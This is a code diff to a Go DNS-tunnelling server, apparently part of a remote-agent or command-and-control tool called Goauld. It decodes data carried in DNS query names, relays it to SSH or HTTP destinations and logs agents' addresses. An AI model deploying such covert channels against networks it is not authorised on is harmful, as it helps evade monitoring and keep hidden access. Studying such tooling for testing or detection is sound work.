@@ -26,6 +26,7 @@ SOFTWARE.
 import (
 	"Goauld/common/log"
 	"Goauld/common/net/blind"
+	"Goauld/server/persistence"
 	"fmt"
 	"io"
 	"net"
@@ -109,7 +110,7 @@ func (s *BlindSession) Write(data []byte) error {
 	}
 
 	// Set write deadline
-	s.conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+	s.conn.SetWriteDeadline(time.Now().Add(250 * time.Millisecond))
 	defer s.conn.SetWriteDeadline(time.Time{})
 
 	_, err := s.conn.Write(data)
@@ -132,8 +133,8 @@ func (s *BlindSession) Read(buffer []byte) (int, error) {
 	}
 
 	// Set a short read deadline
-	s.conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
-	defer s.conn.SetReadDeadline(time.Time{})
+	//s.conn.SetReadDeadline(time.Now().Add(250 * time.Millisecond))
+	//defer s.conn.SetReadDeadline(time.Time{})
 
 	n, err := s.conn.Read(buffer)
 	if err != nil {
@@ -178,20 +179,26 @@ func (s *BlindSession) IsClosed() bool {
 
 type DNSServer struct {
 	//dnsListener            string
-	tcpDest                string
+	SSHDest                string
+	HTTPDest               string
+	domain                 string
 	sessions               map[string]*BlindSession
 	mu                     sync.Mutex
 	debug                  bool
 	sessionCleanupInterval time.Duration
+	db                     *persistence.DB
 }
 
-func NewDNSServer(tcpDest string, debug bool) *DNSServer {
+func NewDNSServer(db *persistence.DB, SSHDest string, HTTPDest string, domain string, debug bool) *DNSServer {
 	return &DNSServer{
 		//dnsListener: dnsListener,
-		tcpDest:  tcpDest,
+		HTTPDest: HTTPDest,
+		SSHDest:  SSHDest,
+		domain:   domain,
 		sessions: make(map[string]*BlindSession),
 		mu:       sync.Mutex{},
 		debug:    debug,
+		db:       db,
 	}
 }
 
@@ -214,6 +221,10 @@ func (s *DNSServer) getBlindSession(sessionID string) (*BlindSession, error) {
 	s.mu.Lock()
 	defer s.mu.Unlock()
 
+	dest := s.SSHDest
+	if strings.HasPrefix(sessionID, "C") {
+		dest = s.HTTPDest
+	}
 	session, exists := s.sessions[sessionID]
 	if !exists || session.conn == nil {
 		// Create new session with connection
@@ -222,14 +233,14 @@ func (s *DNSServer) getBlindSession(sessionID string) (*BlindSession, error) {
 		}
 
 		// Connect using IPv4
-		if err := session.reconnect(s.tcpDest); err != nil {
+		if err := session.reconnect(dest); err != nil {
 			return nil, err
 		}
 
 		s.sessions[sessionID] = session
 
 		if s.debug {
-			log.Printf("Created new connection for session %s to %s", sessionID, s.tcpDest)
+			log.Printf("Created new connection for session %s to %s", sessionID, dest)
 		}
 	}
 
@@ -243,11 +254,13 @@ func (s *DNSServer) handlePoll(session *BlindSession) ([]byte, error) {
 
 	buffer := make([]byte, blind.MaxChunkSize)
 
-	session.conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
+	session.conn.SetReadDeadline(time.Now().Add(250 * time.Millisecond))
 	defer session.conn.SetReadDeadline(time.Time{})
 
 	n, err := session.conn.Read(buffer)
 	if err != nil {
+		log.Trace().Msgf("Read error: %v", err)
+		log.Trace().Msgf("Read error: %v", err)
 		if err == io.EOF || strings.Contains(err.Error(), "connection reset") {
 			session.Close()
 			return []byte("CLOSED"), nil
@@ -272,10 +285,10 @@ func (s *DNSServer) handleDNSRequest(dnsConn net.PacketConn, r *dns.Msg, addr ne
 
 	question := r.Question[0]
 	if s.debug {
-		log.Printf("=== Received DNS Request ===")
-		log.Printf("From: %s", addr.String())
-		log.Printf("Raw message: %v", r.String())
-		log.Printf("Question: %s (type: %d)", question.Name, question.Qtype)
+		//log.Printf("=== Received DNS Request ===")
+		//log.Printf("From: %s", addr.String())
+		//log.Printf("Raw message: %v", r.String())
+		//log.Printf("Question: %s (type: %d)", question.Name, question.Qtype)
 	}
 
 	// Create response message
@@ -290,35 +303,33 @@ func (s *DNSServer) handleDNSRequest(dnsConn net.PacketConn, r *dns.Msg, addr ne
 	}
 
 	// Parse the DNS question
-	parts := strings.Split(strings.TrimSuffix(question.Name, "."), ".")
-
+	parts := strings.Split(strings.TrimSuffix(strings.TrimSuffix(strings.TrimSuffix(question.Name, "."), s.domain), "."), ".")
 	// Validate parts length
-	if len(parts) < 4 {
+	if len(parts) < 3 {
 		if s.debug {
 			log.Printf("Invalid request format: not enough parts")
 		}
 		msg.Rcode = dns.RcodeFormatError
 		err := WriteMsg(msg, dnsConn, addr)
 		if err != nil {
-			log.Trace().Err(err).Str("Mode", "DNSSH2").Msg("Failed to send DNS message")
+			log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
 		}
 		return
 	}
 
 	// Extract parts in reverse order since DNS names are right-to-left
-	tld := parts[len(parts)-1]
-	sessionID := parts[len(parts)-2]
-	sequence := parts[len(parts)-3]
+	sessionID := parts[len(parts)-1]
+	sequence := parts[len(parts)-2]
 
 	// Combine all remaining parts as the encoded data
-	encodedData := strings.Join(parts[:len(parts)-3], ".")
+	encodedData := strings.Join(parts[:len(parts)-2], ".")
 
 	if s.debug {
 		log.Printf("Parsed request:")
 		log.Printf("  Encoded data: %s", encodedData)
 		log.Printf("  Sequence: %s", sequence)
 		log.Printf("  BlindSession ID: %s", sessionID)
-		log.Printf("  TLD: %s", tld)
+		log.Printf("  TLD: %s", s.domain)
 	}
 
 	// Get or create session
@@ -330,11 +341,18 @@ func (s *DNSServer) handleDNSRequest(dnsConn net.PacketConn, r *dns.Msg, addr ne
 		msg.Rcode = dns.RcodeServerFailure
 		err = WriteMsg(msg, dnsConn, addr)
 		if err != nil {
-			log.Trace().Err(err).Str("Mode", "DNSSH2").Msg("Failed to send DNS message")
+			log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
 		}
 		return
 	}
 
+	if sequence == "aaaa" && strings.HasPrefix(sessionID, "S") {
+		err = s.db.SetAgentSSHMode(encodedData, "DNS-ALT", strings.Split(addr.String(), ":")[0])
+		if err != nil {
+			log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
+		}
+		return
+	}
 	// Handle the request
 	isPoll := sequence == "ffff"
 	var responseText string
@@ -347,6 +365,9 @@ func (s *DNSServer) handleDNSRequest(dnsConn net.PacketConn, r *dns.Msg, addr ne
 			}
 			msg.Rcode = dns.RcodeServerFailure
 			err = WriteMsg(msg, dnsConn, addr)
+			if err != nil {
+				log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
+			}
 			return
 		}
 
@@ -377,12 +398,12 @@ func (s *DNSServer) handleDNSRequest(dnsConn net.PacketConn, r *dns.Msg, addr ne
 			msg.Answer = append(msg.Answer, txt)
 
 			if s.debug {
-				log.Printf("Sending response with %d chunks", len(chunks))
+				//log.Printf("Sending response with %d chunks", len(chunks))
 			}
 		}
 		err = WriteMsg(msg, dnsConn, addr)
 		if err != nil {
-			log.Trace().Err(err).Str("Mode", "DNSSH2").Msg("Failed to send DNS message")
+			log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
 		}
 		return
 	} else {
@@ -395,24 +416,24 @@ func (s *DNSServer) handleDNSRequest(dnsConn net.PacketConn, r *dns.Msg, addr ne
 			msg.Rcode = dns.RcodeFormatError
 			err = WriteMsg(msg, dnsConn, addr)
 			if err != nil {
-				log.Trace().Err(err).Str("Mode", "DNSSH2").Msg("Failed to send DNS message")
+				log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
 			}
 			return
 		}
 
 		if len(decodedData) > 0 {
 			if s.debug {
-				log.Printf("Writing %d bytes to connection", len(decodedData))
+				//log.Printf("Writing %d bytes to connection", len(decodedData))
 			}
 
 			if err := session.Write(decodedData); err != nil {
 				if s.debug {
-					log.Printf("Failed to write to connection: %v", err)
+					//log.Printf("Failed to write to connection: %v", err)
 				}
 				msg.Rcode = dns.RcodeServerFailure
 				err = WriteMsg(msg, dnsConn, addr)
 				if err != nil {
-					log.Trace().Err(err).Str("Mode", "DNSSH2").Msg("Failed to send DNS message")
+					log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
 				}
 				return
 			}
@@ -456,12 +477,12 @@ func (s *DNSServer) handleDNSRequest(dnsConn net.PacketConn, r *dns.Msg, addr ne
 	}
 
 	if s.debug {
-		log.Printf("Sending response with %d chunks", len(msg.Answer[0].(*dns.TXT).Txt))
+		//log.Printf("Sending response with %d chunks", len(msg.Answer[0].(*dns.TXT).Txt))
 	}
 
 	err = WriteMsg(msg, dnsConn, addr)
 	if err != nil {
-		log.Trace().Err(err).Str("Mode", "DNSSH2").Msg("Failed to send DNS message")
+		log.Trace().Err(err).Str("Mode", "DNSSH-ALT").Msg("Failed to send DNS message")
 	}
 }
 
@@ -472,10 +493,15 @@ func (s *DNSServer) createBlindSession(sessionID string) (*BlindSession, error) 
 		DualStack: false, // Disable IPv6
 	}
 
+	dest := s.SSHDest
+
+	if strings.HasPrefix(sessionID, "C") {
+		dest = s.HTTPDest
+	}
 	// Resolve address to IPv4 only
-	host, port, err := net.SplitHostPort(s.tcpDest)
+	host, port, err := net.SplitHostPort(dest)
 	if err != nil {
-		return nil, fmt.Errorf("invalid address %s: %v", s.tcpDest, err)
+		return nil, fmt.Errorf("invalid address %s: %v", dest, err)
 	}
 
 	ips, err := net.LookupIP(host)
